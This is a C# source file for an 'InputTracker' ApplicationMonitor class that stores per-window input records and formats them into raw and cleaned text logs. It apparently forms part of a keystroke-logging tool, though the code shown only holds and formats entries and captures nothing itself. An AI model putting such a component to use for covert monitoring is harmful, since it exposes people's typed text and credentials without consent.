using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace InputTracker {
    public class ApplicationMonitor {
        private List<ApplicationInput> _inputs;

        public ApplicationMonitor() {
            _inputs = new List<ApplicationInput>();
        }

        public string LastRawLog {
            get {
                ApplicationInput last = _inputs.Last();

                return $"[{last.Date} | {last.WindowTitle} ({last.Title})]:\n" +
                    (last.RawText.Length > 0 ? last.RawText + "\n" : "") + "\n";
            }
        }

        public string AllRawLog {
            get {
                StringBuilder log = new StringBuilder();

                foreach (ApplicationInput input in _inputs) {
                    log.Append($"[{input.Date} | {input.WindowTitle} ({input.Title})]:\n")
                    .Append(input.RawText.Length > 0 ? $"{input.RawText}\n\n" : "\n");
                }

                return log.ToString();
            }
        }

        public string LastRegularLog {
            get {
                ApplicationInput last = _inputs.Last();

                return $"[{last.Date} | {last.WindowTitle} ({last.Title})]:\n" +
                    (last.RegularText.Length > 0 ? last.RegularText + "\n" : "") + "\n";
            }
        }

        public string AllRegularLog {
            get {
                StringBuilder log = new StringBuilder();

                foreach (ApplicationInput input in _inputs) {
                    log.Append($"[{input.Date} | {input.WindowTitle} ({input.Title})]:\n")
                    .Append(input.RegularText.Length > 0 ? $"{input.RegularText}\n\n" : "\n");
                }

                return log.ToString();
            }
        }

        public void Add(ApplicationInput input) {
            _inputs.Add(input);
        }

        public void Clear() {
            _inputs.Clear();
        }
    }
}
